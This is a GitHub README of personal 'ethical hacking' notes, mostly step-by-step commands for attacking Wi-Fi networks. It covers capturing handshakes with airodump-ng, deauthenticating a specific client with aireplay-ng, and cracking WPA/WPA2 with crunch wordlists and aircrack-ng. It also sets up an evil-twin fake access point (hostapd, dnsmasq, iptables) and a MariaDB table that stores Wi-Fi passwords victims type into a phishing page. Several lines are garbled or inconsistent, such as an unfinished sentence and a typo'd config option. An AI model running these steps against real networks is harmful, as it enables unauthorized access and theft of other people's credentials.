# Ethical-hacking

This repo includes to perform penetration testting, hacking wep/wpa/wpa2 encrypted wifi using Kali linux and much more.

wireless adapter:
1. should support monitor mode and packet injection.
2. should support both 2.5GHz and 5GHz frequency.
3. should be detectable in kali linux.

Airodump-ng :
1. is a part of aircrack-ng suit
2. its a packet sniffer.
3. capture all pkts within range.
4.display detailed info about network.
5. connected clinets etc.

1. tplink
https://www.amazon.in/TP-Link-TL-WN722N-150Mbps-Wireless-Adapter/dp/B002SZEOLG?th=1
tplink  v2 chipset doesnt support monitor mode, only v1 does.

https://www.youtube.com/watch?v=UTO5mA9_Wm0 --> youtube link to install realtek chipset on kali and enable montior mode.


=================

WEP encryption algorithm:
1. Its based on RC4.
2. WEP generates a unique key.
3.a unique key is a combination of  = IV(24 bit plain text intialization vector) + key

WPA2 uses CCMP encryption while WPA uses 

================

1. airodump commands:
airodump-ng --band ang wlan0

2. capture packets on a particular MAC
airodump-ng --bssid F4:8C:EB:19:98:7E --channel 36 --write handshake wlan0

3. perform deauth attack on a particular device.
aireplay-ng --deauth 4 -a F4:8C:EB:19:98:7E -c 00:26:82:8D:21:1F wlan0


4. create password file using crunch
crunch 10 12 1235micky -o passwd.txt -t 

5. cracking wpa/wpa2 using a crunch wordlist attack.
aircrack-ng handshake-01.cap -w passwd.txt


======================================================

Twin AP attack links:
1. https://www.youtube.com/watch?time_continue=1003&v=XaKJt6tSd6E&feature=emb_title

2. https://zsecurity.org/hack-wpa-wpa2-wifi-without-wordlist-using-evil-twin-attack/

3.  https://zsecurity.org/how-to-start-a-fake-access-point-fake-wifi/

==========
1. hostapd allows over wireless adapter to broadcast multiple acess point.
2. dnsmasq works as a dhcp server and also handles dns request.
3. apache2 used to give a webpage

cmds:
apt-get update
apt-get install hostapd dnsmasq apache2
enable wlan0 in monitor mode
mkdir ~/fap
cd fap

nano hostapd.conf
copy below content in the file:

interface=wlan0
driver=nl80211
ssid=centuryhome
hw_mode=g
channel=8 --> check the channel of your router & update accordingly
macaddr_acl=0
ignore_broadcast_ssid=0


My router default gw is 192.168.0.1, so updating dhcp-range & option accordingly

nano dnsmasq.conf
interface=wlan0
dhcp-range=192.168.0.2, 192.168.0.30, 255.255.255.0, 12h
dhcp.option=3, 192.168.0.1
dhcp-option=6, 192.168.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=192.168.0.1


#routing table and gateway
ifconfig wlan0 up 192.168.0.1 netmask 255.255.255.0
route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.0.1

#ip table configuration 
We need to forward traffic from eth0, the  virtual wireless adapter that is connected to the internet, to wlan0. 
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward --> enal=ble ip forwarding

First command: Interface name that is used to forward traffic from.
Second command: Interface name to receive the packets or the interface that is being forwarded to.

#database config:

service mysql start
mysql
MariaDB [(none)]> create database fap;
MariaDB [(none)]> create user fapuser;
MariaDB [(none)]> grant all on rogueap.* to 'fapuser'@'localhost' identified by 'fappassword';
MariaDB [(none)]> grant all on fap.wpa_keys to 'fapuser'@'localhost' identified by 'fappassword';
MariaDB [(none)]> use fap;
MariaDB [fap]> create table wpa_keys(password1 varchar(40), password2 varchar(40));

MariaDB [fap]> ALTER DATABASE fap CHARACTER SET 'utf8';
MariaDB [fap]> select * from wpa_keys;


Now connect to the new unsecured wifi and type 192.168.0.1 in url.
Enter your wifi password.

check password in your database.
select * from wpa_keys;

=================================================
